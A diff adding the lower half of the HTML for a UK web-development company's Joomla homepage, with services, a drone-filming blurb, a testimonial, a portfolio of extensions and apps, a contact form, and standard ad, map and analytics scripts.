+	<li itemscope itemtype="http://schema.org/Article">
+		<a href="/services/documentation/module-joes-word-cloud-jwc.html" itemprop="url">
+				Joes Word Cloud (JWC)		</a>
+	</li>
+	<li itemscope itemtype="http://schema.org/Article">
+		<a href="/3rd-party-joomla/articles/web-development/joomla/3rd-party-joomla/migrate-jcomments-from-joomla-15x-to-joomla-25x.html" itemprop="url">
+				Migrate JComments from Joomla 1.5.x to Joomla 2.5.x		</a>
+	</li>
+	<li itemscope itemtype="http://schema.org/Article">
+		<a href="/articles/microsoft/ms-windows/windows-7-system-clock-is-constantly-going-out-of-sync.html" itemprop="url">
+				Windows 7:  System Clock is constantly going out of sync		</a>
+	</li>
+</ul>
+</div>		</div>
+			<div class="moduletable jl_googleads">
+						
+
+<div class="custom jl_googleads"  >
+	<style>
+/* googleads: overrides */
+.jl_googleads{text-align:center;padding:20px;}
+</style>
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- long horizontal -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:728px;height:90px"
+     data-ad-client="ca-pub-1827224878735647"
+     data-ad-slot="7678121814"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script> </div>
+		</div>
+	
+				</div>
+<!--			</section> //-->
+          </section>
+
+			
+
+				<section id="separator-video" data-stellar-background-ratio="0.6" data-stellar-vertical-offset="">
+                    <div class="container">
+                    	<div class="row">
+                        	<div class="col-md-6 separator-video-content wow flipInX">
+                            			<div class="moduletable">
+						
+
+<div class="custom"  >
+	<h2 class="video-info">As Flyers Ourselves<br><small>We love "drones"</small></h2>
+                                
+                                <br>
+                                <p class="p-info" style="font-weight:bold">Obviously we don't mean the ones that kill people; but the toy quadcopter camera drones used by professionals and hobbyists alike.  Unmanned aerial systems (UAS) or remotely piloted aircraft systems (RPAS) have been around for a long time; and technological advances are making these even more popular than ever.  The ability to throw a camera in the air and take a selfie at 400 feet above generates a gathering of people, wherever we film, irrespective of age or culture.</p> 
+                                </div>
+		</div>
+	
+                            </div>
+                            <div class="col-md-6 separator-video-content">
+								<div class="fluid-width-video-wrapper" style="padding-top:56.25%;">
+                            			<div class="moduletable">
+						
+
+<div class="custom"  >
+	<!-- http://player.vimeo.com/video/85844473 //-->
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/B9afOeBUqpg?list=PLQCklkWQduCbXNqCIcCE6E4v8dRIHXNx2" frameborder="0" allowfullscreen></iframe></div>
+		</div>
+	
+								</div>
+                            </div>
+                        </div>
+                    </div>
+            </section>
+        	
+
+									<section id="services">
+                <div class="container">
+							<div class="moduletable">
+						
+
+<div class="custom"  >
+	<div class="col-lg-12 section-title wow flipInX">
+                        <h2><small>What We Do</small><br><strong>Our Capabilities</strong></h2>
+                        <p class="lead">A highly skilled professional service with a <span class="highlight">creative touch.</span></p>
+                    </div>
+                    <div class="services-container">
+                        <div class="row services-row">
+                            <div class="col-md-4 col-sm-6 wow flipInX">
+                                <div class="service">
+                                    <div class="service-icon">
+                                        <i class="icon ion-ios-monitor-outline ion-3x highlight"></i>
+                                        <i class="icon ion-ios-monitor-outline back-icon"></i>
+                                    </div>
+                                    <div class="service-info">
+                                      <h4>Service Design<br><small>Persistent Dedication </small></h4>
+                                        <p class="service-description">We don't just build a solution for web-based projects; we build a product that everyone can be proud to be part of.</p>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-4 col-sm-6 wow flipInY">
+                                <div class="service">
+                                    <div class="service-icon">
+                                        <i class="icon ion-social-github ion-3x highlight"></i>
+                                        <i class="icon ion-social-github back-icon"></i>
+                                    </div>
+                                    <div class="service-info">
+                                      <h4>Crazy Coding<br><small>Hand Developing</small></h4>
+                                        <p class="service-description">We can customize most systems we encounter no matter how complex... with a basic text-editor.</p>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-4 col-sm-6 wow flipInX">
+                                <div class="service">
+                                    <div class="service-icon">
+                                        <i class="icon ion-speedometer ion-3x highlight"></i>
+                                        <i class="icon ion-speedometer back-icon"></i>
+                                    </div>
+                                    <div class="service-info">
+                                      <h4>Web Optimization<br><small>Faster than Light</small></h4>
+                                        <p class="service-description">We can do an in-depth error analysis, security vulnerability checks and implement performance improvements. </p>
+                                    </div>
+                                </div>
+                            </div>                
+                            <div class="col-md-4 col-sm-6 wow flipInY">
+                                <div class="service">
+                                    <div class="service-icon">
+                                        <i class="icon ion-map ion-3x highlight"></i>
+                                        <i class="icon ion-map back-icon"></i>
+                                    </div>
+                                    <div class="service-info">
+                                      <h4>Automation<br><small>It's possible to duplicate you</small></h4>
+                                        <p class="service-description">Anything you can do once with a computer, we can automate to do 1000 times over.</p>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-4 col-sm-6 wow flipInX">
+                                <div class="service">
+                                    <div class="service-icon">
+                                    	<i class="icon ion-ionic ion-3x highlight"></i>
+                                        <i class="icon ion-ionic back-icon"></i>
+                                    </div>
+                                    <div class="service-info">
+                                      <h4>Customer Support<br><small>And Affinity</small></h4>
+                                        <p class="service-description">We pride ourselves on our reputation: quick to respond and never fail to deliver!</p>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-4 col-sm-6 wow flipInY">
+                                <div class="service">
+                                    <div class="service-icon">
+                                        <i class="icon ion-paper-airplane ion-3x highlight"></i>
+                                        <i class="icon ion-paper-airplane back-icon"></i>
+                                    </div>
+                                    <div class="service-info">
+                                      <h4>Aerial Filming<br><small>Taking to the Skies</small></h4>
+                                        <p class="service-description">Our fray into quadcopters or toy "drones" has embarked us on a journey upwards and forwards.</p>
+                                    </div>
+                                </div>
+                            </div>                
+                        </div>
+                	</div></div>
+		</div>
+	
+				</div>
+			</section>
+			
+
+        							<section id="separator-testimonials" data-stellar-background-ratio="0.7" >
+                <div class="row text-center" style="position:relative;">
+                	<div class="parallax-overlay"></div>
+							<div class="moduletable">
+						
+					<div class="quotes liquid-slider" id="separator-slider-1">
+<div id="ns2-108" class="nssp2 ns2-108">
+	<div class="ns2-wrap">
+					<div class="ns2-art-wrap  nssp2-animation nssp2-default ">			
+				<div class="ns2-art-pages">
+									<div class="ns2-page">
+						<div class="ns2-page-inner">
+													<div class="ns2-row ns2-first ns2-odd">
+								<div class="ns2-row-inner">
+																										<div class="ns2-column flt-left col-1">
+										<div style="padding:0 0 0 0">
+											<div class="ns2inner">
+																								
+											
+																								
+																									<h2><i class="fa fa-quote-left highlight"></i><small class="white">  Joe did a really superb job for me on this. My website crashed and I had no idea how to fix it. My hosting service were no help at all. Worse, I hadn't backed up my website for 18 months so even if Joe managed to retrieve it I expected most of my data to have gone. Joe not only fixed it immediately but all the data was still there too! Magic!  </small><i class="fa fa-quote-right highlight"></i></h2>								
+																																					<p class="label label-primary">
+															
+															Collin Consulting Ltd															
+													</p>
+																								
+													
+															
+												
+												
+												
+												
+												<div class="ns2-social">
+																									</div>
+												
+																								
+																				
+												
+																								<div style="clear:both"></div>
+												
+											</div>
+										</div>
+									</div>
+																									<div style="clear:both"></div>
+							</div>
+							<div style="clear:both"></div>
+							</div>
+												<div style="clear:both"></div>
+						</div><!--end ns2-page-inner-->
+					</div>
+								</div>
+				
+				
+									<div style="clear:both"></div>
+					<div class="ns2-art-controllers">
+																			<div class="ns2-art-prev"></div>
+													
+											
+							<div class="ns2-art-next"></div>
+												<div style="clear:both"></div>
+					</div>
+								<div style="clear:both"></div>
+			</div>
+				<!--End article layout-->
+		
+		<!--Links Layout-->
+				<!--End Links Layout-->
+		<div style="clear:both"></div>
+	</div>
+</div>
+</div>
+
+
+<script type="text/javascript">
+//<![CDATA[
+window.addEvent('load', function() {
+	new nssp2({
+		container: document.getElement('#ns2-108 .ns2-art-pages'),
+		interval: 20000,
+		activator: "click",
+		transition: "cover-inplace-fade",	
+		fxOptions: {
+			duration:  500, 
+			transition: Fx.Transitions.linear		},
+		buttons: {
+						previous: document.getElement('#ns2-108 .ns2-art-prev')
+			,next: document.getElement('#ns2-108 .ns2-art-next')
+								}
+				,autoPlay: 1	});
+});
+
+//]]>
+</script>		</div>
+	
+				</div>
+			</section>
+			
+
+						<section id="our-work">
+                <div class="container">
+								<div class="moduletable">
+						
+<div class="col-lg-12 text-center wow flipInX f_left">
+			<h2><small>Take a Look at</small><br /><strong>Some of Our Work</strong></h2>
+						<p class="lead">A wide range of <span class="highlight">successful</span> digital projects.</p>
+		</div>
+
+
+
+<div id="sp-portfolio-module-109" class="sp-portfolio default">
+
+						<div id="filters-container" class="cbp-l-filters-button">
+			<div data-filter="*" class="cbp-filter-item-active cbp-filter-item">Show All<div class="cbp-filter-counter"></div></div>
+			   
+			<div data-filter=".web-extensions" class="cbp-filter-item">Web Extensions<div class="cbp-filter-counter"></div></div>
+			   
+			<div data-filter=".mobile-apps" class="cbp-filter-item">Mobile Apps<div class="cbp-filter-counter"></div></div>
+			   
+			<div data-filter=".standalones" class="cbp-filter-item">Standalones<div class="cbp-filter-counter"></div></div>
+			  
+		</div>
+				
+                <div id="grid-container" class="cbp-l-grid-projects">
+            <ul class="grid cs-style-3">
+
+			            <li class="cbp-item web-extensions">
+               <figure>
+                	<img src="http://joellipman.com/images/apps/joomla_app_jrm_002.png" alt="Joes Revolver Map" class="fullwidth">
+					
+					
+                    <div class="thumbTextWrap">
+                        <figcaption>
+																					<a class="cbp-lightbox" data-title="Joes Revolver Map" href="http://joellipman.com/images/apps/joomla_app_jrm_002.png"><i class="fa fa-search fa-2x"></i></a>
+																												<a href="/products/web-extensions/joes-revolver-map.html"><i class="fa fa-expand fa-2x"></i></a>
+														
+																					<h4 class="sectionTitle"><a href="/products/web-extensions/joes-revolver-map.html">Joes Revolver Map</a></h4>
+																						
+														
+						</figcaption>
+                    </div>
+               </figure>
+            </li>
+                       <li class="cbp-item standalones">
+               <figure>
+                	<img src="http://joellipman.com/images/apps/app_jcg_001.png" alt="CSV Chart Generator" class="fullwidth">
+					
+					
+                    <div class="thumbTextWrap">
+                        <figcaption>
+																					<a class="cbp-lightbox" data-title="CSV Chart Generator" href="http://joellipman.com/images/apps/app_jcg_001.png"><i class="fa fa-search fa-2x"></i></a>
+																												<a href="/products/standalones/csv-chart-generator.html"><i class="fa fa-expand fa-2x"></i></a>
+														
+																					<h4 class="sectionTitle"><a href="/products/standalones/csv-chart-generator.html">CSV Chart Generator</a></h4>
+																						
+														
+						</figcaption>
+                    </div>
+               </figure>
+            </li>
+                       <li class="cbp-item web-extensions">
+               <figure>
+                	<img src="http://joellipman.com/images/apps/joomla_app_jwc_002.png" alt="Joes Word Cloud" class="fullwidth">
+					
+					
+                    <div class="thumbTextWrap">
+                        <figcaption>
+																					<a class="cbp-lightbox" data-title="Joes Word Cloud" href="http://joellipman.com/images/apps/joomla_app_jwc_002.png"><i class="fa fa-search fa-2x"></i></a>
+																												<a href="/products/web-extensions/portfolio-1.html"><i class="fa fa-expand fa-2x"></i></a>
+														
+																					<h4 class="sectionTitle"><a href="/products/web-extensions/portfolio-1.html">Joes Word Cloud</a></h4>
+																						
+														
+						</figcaption>
+                    </div>
+               </figure>
+            </li>
+                       <li class="cbp-item mobile-apps">
+               <figure>
+                	<img src="http://joellipman.com/images/apps/quadcopter_app_16_240x240.png" alt="Quadcopter App for AndroidOS" class="fullwidth">
+					
+					
+                    <div class="thumbTextWrap">
+                        <figcaption>
+																					<a class="cbp-lightbox" data-title="Quadcopter App for AndroidOS" href="http://joellipman.com/images/apps/quadcopter_app_16_240x240.png"><i class="fa fa-search fa-2x"></i></a>
+																												<a href="/products/mobile-apps/joes-quadcopter-app.html"><i class="fa fa-expand fa-2x"></i></a>
+														
+																					<h4 class="sectionTitle"><a href="/products/mobile-apps/joes-quadcopter-app.html">Quadcopter App for AndroidOS</a></h4>
+																						
+														
+						</figcaption>
+                    </div>
+               </figure>
+            </li>
+                       <li class="cbp-item standalones">
+               <figure>
+                	<img src="http://joellipman.com/images/apps/joe_app_jtd_001.png" alt="Joes Transmission Detector" class="fullwidth">
+					
+					
+                    <div class="thumbTextWrap">
+                        <figcaption>
+																					<a class="cbp-lightbox" data-title="Joes Transmission Detector" href="http://joellipman.com/images/apps/joe_app_jtd_001.png"><i class="fa fa-search fa-2x"></i></a>
+																												<a href="/products/standalones/joes-transmission-detector.html"><i class="fa fa-expand fa-2x"></i></a>
+														
+																					<h4 class="sectionTitle"><a href="/products/standalones/joes-transmission-detector.html">Joes Transmission Detector</a></h4>
+																						
+														
+						</figcaption>
+                    </div>
+               </figure>
+            </li>
+                       <li class="cbp-item web-extensions">
+               <figure>
+                	<img src="http://joellipman.com/images/apps/joomla_app_jqw_001.png" alt="Joes Quicklist Weblinks" class="fullwidth">
+					
+					
+                    <div class="thumbTextWrap">
+                        <figcaption>
+																					<a class="cbp-lightbox" data-title="Joes Quicklist Weblinks" href="http://joellipman.com/images/apps/joomla_app_jqw_001.png"><i class="fa fa-search fa-2x"></i></a>
+																												<a href="/products/web-extensions/joes-quicklist-weblinks.html"><i class="fa fa-expand fa-2x"></i></a>
+														
+																					<h4 class="sectionTitle"><a href="/products/web-extensions/joes-quicklist-weblinks.html">Joes Quicklist Weblinks</a></h4>
+																						
+														
+						</figcaption>
+                    </div>
+               </figure>
+            </li>
+           
+         </ul>
+		</div>
+
+	</div><!--/.sp-portfolio-->
+
+
+
+		</div>
+			<div class="moduletable jl_googleads">
+						
+
+<div class="custom jl_googleads"  >
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- long horizontal -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:728px;height:90px"
+     data-ad-client="ca-pub-1827224878735647"
+     data-ad-slot="7678121814"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script> </div>
+		</div>
+	
+				</div>
+			</section>
+			
+		
+
+						<section id="get-connected" data-stellar-background-ratio="0.7">
+                <div class="row text-center" style="position:relative;">
+                	<div class="parallax-overlay"></div>
+							<div class="moduletable">
+						
+
+<div class="custom"  >
+	<div class="container connected-row text-center wow flipInX">
+                            <h2><small class="white">Get Connected <br></small>Follow Us</h2>
+                            <p class="lead">Get connected with us on social networks!</p>
+
+                    	<ul class="connected-icons text-center">
+
+                            <li class="col-sm-2 col-xs-6 connected-icon"><a target="_blank" href="https://twitter.com/Joel_Lipman">
+                                	<span class="fa-stack fa-lg fa-4x">
+                                     	<i class="fa fa-circle fa-stack-2x"></i>
+                                    	<i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                                	</span><br>
+                                    <span class="lead">Twitter</span><br>
+                                    <span class="white">Follow Us</span>
+                                </a>
+                            </li>
+ 			<li class="col-sm-2 col-xs-6 connected-icon"><a target="_blank" href="https://www.linkedin.com/in/joelipman">
+                                	<span class="fa-stack fa-lg fa-4x">
+                                     	<i class="fa fa-circle fa-stack-2x"></i>
+                                    	<i class="fa fa-linkedin fa-stack-1x fa-inverse"></i>
+                                	</span><br>
+                                    <span class="lead">LinkedIn</span><br>
+                                    <span class="white">Be Our Friend</span>
+                                </a>
+                            </li>
+                            <li class="col-sm-2 col-xs-6 connected-icon"><a target="_blank" href="http://google.com/+JoeLipman">
+                                	<span class="fa-stack fa-lg fa-4x">
+                                     	<i class="fa fa-circle fa-stack-2x"></i>
+                                    	<i class="fa fa-google-plus-square fa-stack-1x fa-inverse"></i>
+                                	</span><br>
+                                    <span class="lead">Google+</span><br>
+                                    <span class="white">Join Our Circle</span>
+                                </a>
+                            </li>
+                            <li class="col-sm-2 col-xs-6 connected-icon"><a target="_blank" href="https://www.youtube.com/user/joeylipman">
+                                	<span class="fa-stack fa-lg fa-4x">
+                                     	<i class="fa fa-circle fa-stack-2x"></i>
+                                    	<i class="fa fa-youtube-play fa-stack-1x fa-inverse"></i>
+                                	</span><br>
+                                    <span class="lead">Youtube</span><br>
+                                    <span class="white">Watch Our Videos</span>
+                                </a>
+                            </li>
+
+
+                            <li class="col-sm-2 col-xs-6 connected-icon"><a target="_blank" href="http://uk.pinterest.com/joellipman">
+                                	<span class="fa-stack fa-lg fa-4x">
+                                     	<i class="fa fa-circle fa-stack-2x"></i>
+                                    	<i class="fa fa-pinterest fa-stack-1x fa-inverse"></i>
+                                	</span><br>
+                                    <span class="lead">Pinterest</span><br>
+                                    <span class="white">Inspire Us</span>
+                                </a>
+                            </li>
+
+                            <li class="col-sm-2 col-xs-6 connected-icon"><a target="_blank" href="Skype:+448000016195?call">
+                                	<span class="fa-stack fa-lg fa-4x">
+                                     	<i class="fa fa-circle fa-stack-2x"></i>
+                                    	<i class="fa fa-skype fa-stack-1x fa-inverse"></i>
+                                	</span><br>
+                                    <span class="lead">Skype</span><br>
+                                    <span class="white">Chat with Us</span>
+                                </a>
+                            </li>
+
+                    	</ul>        
+                	</div>    
+                </div>
+		</div>
+	
+				</div>
+			</section>
+			
+
+			
+			
+						<section id="contacts">
+							<div class="moduletable">
+						
+<div class="col-lg-12 text-center wow flipInX">
+	    <h2><small>Get In Touch</small><br /><strong>Contact Us</strong></h2>
+		    <p class="lead">We would like to <span class="highlight">hear from you.</span></p>
+	 </div>
+
+<div class="container">
+<div class="col-lg-12 text-center wow flipInX" id="contact">
+<section id="contact">
+	<script type="text/javascript">
+		 var RecaptchaOptions = {
+			theme : "clean"
+		 };
+	 </script>
+	<form action="/" method="POST" class="contactForm" id="contact-form" novalidate>
+	  <input type='hidden' name='form_key' id='form_key' value='393dda18d0ed3ac7f12d059416878caf' />	  <fieldset>
+		<!-- Alert Box-->
+				
+				<div class="formSecWrap col-md-6">
+		<!-- Name Field -->
+		  <div class="control-group">
+			<div class="controls">
+			  <input name="name" type="text" id="inputName" placeholder="Name" required>
+			  <p class="help-block"></p>
+			</div>
+		  </div>
+		 
+		 <!-- E-mail Field -->
+		  			  
+		  <div class="control-group">
+			<div class="controls">
+			  <input name="email" type="email" id="inputEmail" placeholder="Email" required>
+			  <p class="help-block"></p>
+			</div>
+		  </div>
+		  		  
+		  <!-- Website Field -->
+		  <div class="control-group ">
+			<div class="controls">
+			  <input name="website" type="text" id="inputWebsite" placeholder="Website" required>
+			  <p class="help-block"></p>
+			</div>
+		  </div>
+		  		 
+		 <!-- Subject Field -->
+		  <div class="control-group">
+			<div class="controls">
+										<input name="type" type="text" id="selectSubject" placeholder="Subject" required>
+						<p class="help-block"></p>
+							</div>
+		  </div>
+		</div>
+		<div class="formSecWrap formSecWrap2">
+		  		 
+		 <!-- Message Field -->
+		  <div class="control-group col-md-6">
+			<div class="controls">
+			  <textarea name="message" rows="12" id="inputMessage" placeholder="Please include as much detail as possible." minlength="0" required></textarea>
+			  <p class="help-block"></p>
+			</div>
+		  
+		  		 
+		 <!-- Captcha Field -->
+		  <div class="control-group">
+			<div class="controls" id="recaptcha">
+				<p>
+					<script type="text/javascript" src="http://www.google.com/recaptcha/api/challenge?k=6LcNBL0SAAAAAATdYpI1L5OLGVo-Y7e8TxnVq_Wf"></script>
+
+	<noscript>
+  		<iframe src="http://www.google.com/recaptcha/api/noscript?k=6LcNBL0SAAAAAATdYpI1L5OLGVo-Y7e8TxnVq_Wf" height="300" width="500" frameborder="0"></iframe><br/>
+  		<textarea name="recaptcha_challenge_field" rows="3" cols="40"></textarea>
+  		<input type="hidden" name="recaptcha_response_field" value="manual_challenge"/>
+	</noscript>				</p>
+			</div>
+		  </div> 
+		  		 </div>
+		 <!-- Submit Button -->
+		   <div class="control-group col-md-12 text-center">
+			<div class="controls">
+			  <button type="submit" name="sbutton" value="Send" class="btn submit ">Send Message</button>
+			</div>
+		  </div>
+		</div>
+		  		</fieldset>
+	</form>
+</section>
+</div>
+</div>		</div>
+			<div class="moduletable jl_googleads">
+						
+
+<div class="custom jl_googleads"  >
+	<style>
+/* googleads: overrides */
+.jl_googleads{text-align:center;padding:20px;}
+</style>
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- long horizontal -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:728px;height:90px"
+     data-ad-client="ca-pub-1827224878735647"
+     data-ad-slot="7678121814"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script> </div>
+		</div>
+			<div class="moduletable">
+						
+
+<div class="custom"  >
+	 <section>
+            	<div id="map"></div>
+</section></div>
+		</div>
+	
+			</section>
+			
+
+			
+			
+
+
+            <div class="container">
+
+            <div class="row">
+								<main id="content" role="main" class="col-lg-12">
+					<!-- Begin Content -->
+					<div id="system-message-container">
+	</div>
+
+					<div class="blog-featured" itemscope itemtype="http://schema.org/Blog">
+
+
+
+
+</div>
+
+					<!-- End Content -->
+				</main>
+							</div>
+			</div>
+			<div id="back-to-top"><a href="#"><i class="ion-arrow-up-b ion-3x"></i></a></div>
+	<!-- Footer -->
+		<footer id="footer">
+            	<div class="col-lg-12 text-center">
+            		<div class="back-to-top">
+                        <i class="fa fa-angle-double-up"></i>
+                    </div>
+                </div>
+
+				<div class="container text-center">
+                	<div class="row">
+					<div class="bannergroup">
+
+
+</div>
+
+					                    	<div class="col-md-12 footer-social">
+									<div class="moduletable">
+						
+
+<div class="custom"  >
+	<ul class="connected-icons text-center">
+                                <li class="connected-icon"><a target="_blank" href="https://twitter.com/Joel_Lipman"><i class="fa fa-twitter fa-2-5x"></i></a></li>
+                                <li class="connected-icon"><a target="_blank" href="https://www.linkedin.com/in/joelipman"><i class="fa fa-linkedin fa-2-5x"></i></a></li> 
+                                <li class="connected-icon"><a target="_blank" href="http://google.com/+JoeLipman"><i class="fa fa-google fa-2-5x"></i></a></li> 
+                                <li class="connected-icon"><a target="_blank" href="https://www.youtube.com/user/joeylipman"><i class="fa fa-youtube fa-2-5x"></i></a></li> 
+                               
+                            </ul>
+</div>
+		</div>
+	
+                        </div>
+                                            <p>Thanks for Visiting! We hope this website has helped you.</p>
+
+                        <h4 class="footer-logo"><a href="/">Joel Lipman .Com</a></h4>
+                        <div class="col-lg-12 footer-menu">
+                        <span style="font-size: 8pt"><i>Joel Lipman Ltd is a company registered in England and Wales (Company No. 09602775 - VAT No. GB206188124)</i><br /><br />All Rights Reserved. Your use of this website constitutes acceptance of the <a href="/global/static-items/privacy-policy.html">Privacy Policy</a> and <a href="/global/static-items/terms-conditions.html">Terms of Use</a>.</span>
+<br /><br />
+                            <span class="pull-left">Copyright &copy; 2016 <a href="/">Joel Lipman .Com</a> <!-- All Rights Reserved. //--> </span>
+
+                        </div>
+
+
+        			</div>
+                </div>
+
+            </footer>
+		</div>
+
+	<script type="text/javascript" src="/templates/wunderkind/js/custom.js"></script>
+	<script>
+		/* ==============================================
+		Google Maps
+		=============================================== */
+		jQuery("#map").gmap3({
+			marker:{
+			address:"Bournemouth UK",
+			options:{ icon: "/images/marker.png"}},
+			map:{
+			options:{
+			styles: [ {
+			stylers: [ { "saturation":-100 }, { "lightness": 0 }, { "gamma": 0.5 }]},
+			],
+			zoom: 13,
+			scrollwheel:false,
+			draggable: true }
+			}
+			});
+	</script>
+    <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+     (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+     m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+     })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-73814161-1', 'auto');
+    ga('send', 'pageview');
+
+    </script>
+
+</body>
+
+
+</html>
